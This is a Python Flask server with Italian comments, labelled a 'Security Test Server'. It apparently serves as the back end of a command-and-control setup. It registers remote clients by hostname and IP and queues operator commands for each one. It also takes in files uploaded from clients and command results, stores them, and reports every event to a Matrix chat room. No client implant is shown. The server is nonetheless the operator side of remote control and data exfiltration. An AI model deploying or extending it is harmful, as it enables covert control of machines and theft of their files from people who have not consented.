from flask import Flask, request, jsonify
import threading
import time
import json
import requests
from datetime import datetime
import logging

app = Flask(__name__)

# Configurazione
MATRIX_WEBHOOK = "https://matrix.org/_matrix/client/r0/rooms/!YOUR_ROOM:matrix.org/send/m.room.message"
MATRIX_TOKEN = "YOUR_MATRIX_TOKEN"

class ClientManager:
    def __init__(self):
        self.clients = {}
        self.next_client_id = 1
        self.lock = threading.Lock()
    
    def add_client(self, client_data):
        with self.lock:
            client_id = self.next_client_id
            self.clients[client_id] = {
                "data": client_data,
                "last_seen": datetime.now(),
                "ip": request.remote_addr
            }
            self.next_client_id += 1
            return client_id
    
    def remove_client(self, client_id):
        with self.lock:
            if client_id in self.clients:
                del self.clients[client_id]
    
    def get_client(self, client_id):
        with self.lock:
            return self.clients.get(client_id)
    
    def list_clients(self):
        with self.lock:
            return self.clients.copy()

client_manager = ClientManager()

def send_to_matrix(message, data_type="SERVER"):
    """Invia notifiche a Matrix"""
    try:
        payload = {
            "msgtype": "m.text",
            "body": f"[{data_type}] {message}"
        }
        headers = {
            "Authorization": f"Bearer {MATRIX_TOKEN}",
            "Content-Type": "application/json"
        }
        requests.post(MATRIX_WEBHOOK, json=payload, headers=headers)
    except Exception as e:
        print(f"Matrix error: {e}")

@app.route('/')
def home():
    return """
    <h1>Security Test Server</h1>
    <p>Server attivo su Render + Matrix</p>
    <p>Client connessi: {}</p>
    <a href="/clients">View Clients</a>
    """.format(len(client_manager.list_clients()))

@app.route('/api/register', methods=['POST'])
def register_client():
    """Client si registra al server"""
    try:
        client_data = request.json
        client_id = client_manager.add_client(client_data)
        
        send_to_matrix(f"🟢 Client {client_id} registrato - {client_data.get('hostname', 'Unknown')}")
        
        return jsonify({
            "status": "success",
            "client_id": client_id,
            "message": "Client registered successfully"
        })
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/api/command', methods=['POST'])
def send_command():
    """Invia comando a client specifico"""
    try:
        data = request.json
        client_id = data.get('client_id')
        command = data.get('command')
        
        client = client_manager.get_client(client_id)
        if not client:
            return jsonify({"status": "error", "message": "Client not found"})
        
        # Qui il client dovrebbe periodicamente pollare per comandi
        # Per ora simuliamo l'esecuzione
        send_to_matrix(f"📡 Comando '{command}' per client {client_id}")
        
        return jsonify({
            "status": "success", 
            "message": f"Command '{command}' queued for client {client_id}"
        })
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/api/upload', methods=['POST'])
def upload_file():
    """Client uploada file"""
    try:
        client_id = request.form.get('client_id')
        file_type = request.form.get('type', 'file')
        
        if 'file' not in request.files:
            return jsonify({"status": "error", "message": "No file uploaded"})
        
        file = request.files['file']
        filename = f"{client_id}_{file_type}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.dat"
        file.save(filename)
        
        send_to_matrix(f"📁 File ricevuto da client {client_id}: {filename}")
        
        return jsonify({"status": "success", "message": f"File {filename} saved"})
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/api/clients', methods=['GET'])
def list_clients():
    """Lista client connessi"""
    clients = client_manager.list_clients()
    return jsonify({
        "status": "success",
        "clients": {
            cid: {
                "data": info["data"],
                "last_seen": info["last_seen"].isoformat(),
                "ip": info["ip"]
            } for cid, info in clients.items()
        }
    })

@app.route('/api/results', methods=['POST'])
def receive_results():
    """Ricevi risultati dai client"""
    try:
        data = request.json
        client_id = data.get('client_id')
        command = data.get('command')
        results = data.get('results')
        
        send_to_matrix(f"📊 Risultati da client {client_id} - {command}:\n{str(results)[:200]}...")
        
        # Salva risultati
        filename = f"results_{client_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
        
        return jsonify({"status": "success", "message": "Results received"})
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

if __name__ == '__main__':
    send_to_matrix("🚀 Server Flask avviato su Render")
    app.run(host='0.0.0.0', port=5000, debug=False)
